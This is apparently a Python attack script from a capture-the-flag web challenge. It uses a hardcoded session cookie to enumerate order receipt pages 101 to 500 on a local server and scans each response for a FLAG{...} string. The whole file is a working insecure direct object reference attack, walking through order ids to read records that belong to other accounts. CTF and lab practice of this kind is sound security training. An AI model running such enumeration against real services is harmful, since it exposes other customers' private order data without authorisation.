import requests
import re

base_url = "http://127.0.0.1:32941"
cookies = {"session": "eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0"}

print("[*] Starting enumeration of /order/{order_id}/receipt from 101-500")
print(f"[*] Using cookie: session={cookies['session'][:20]}...")
print()

# Keep track of stats
total_requests = 0
flags_found = []
anomalies = []

# Iterate from 101 to 500 (inclusive)
for order_id in range(101, 501):
    total_requests += 1
    url = f"{base_url}/order/{order_id}/receipt"
    
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        
        # Check for flag in response
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            print(f"[!] FLAG FOUND at order_id={order_id}")
            print(f"[!] URL: {url}")
            print(f"[!] Response status: {response.status_code}")
            print(f"[!] Response length: {len(response.text)} bytes")
            print(f"[!] Flag(s): {flag_matches}")
            print(f"[!] Full response:\n{response.text}")
            flags_found.extend(flag_matches)
            break  # Stop on first flag found
        
        # Check for anomalies (non-404 or unusual responses)
        if response.status_code != 404:
            print(f"[ANOMALY] order_id={order_id}")
            print(f"  Status: {response.status_code}")
            print(f"  Length: {len(response.text)} bytes")
            print(f"  URL: {url}")
            if len(response.text) != 755:  # Previously identified template size
                print(f"  Note: Response size differs from template (755 bytes)")
            print(f"  Content preview: {response.text[:200]}...")
            print()
            anomalies.append({
                'order_id': order_id,
                'status': response.status_code,
                'length': len(response.text),
                'url': url
            })
        
        # Progress indicator for successful 200 responses
        if total_requests % 50 == 0:
            print(f"[*] Progress: {total_requests}/400 requests completed...")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for order_id={order_id}: {str(e)}")
        continue

# Summary
print("\n[*] Enumeration complete")
print(f"[*] Total requests: {total_requests}")
print(f"[*] Flags found: {len(flags_found)}")
print(f"[*] Anomalies detected: {len(anomalies)}")

if flags_found:
    print("\n[!] SUCCESS: Flag(s) found during enumeration:")
    for flag in flags_found:
        print(f"  - {flag}")

if anomalies:
    print("\n[!] Anomalous responses detected (non-404 or unusual size):")
    for anomaly in anomalies[:10]:  # Show first 10 anomalies
        print(f"  - order_id={anomaly['order_id']}: status={anomaly['status']}, length={anomaly['length']}b")

if not flags_found:
    print("\n[-] No flags found in the range 101-500")
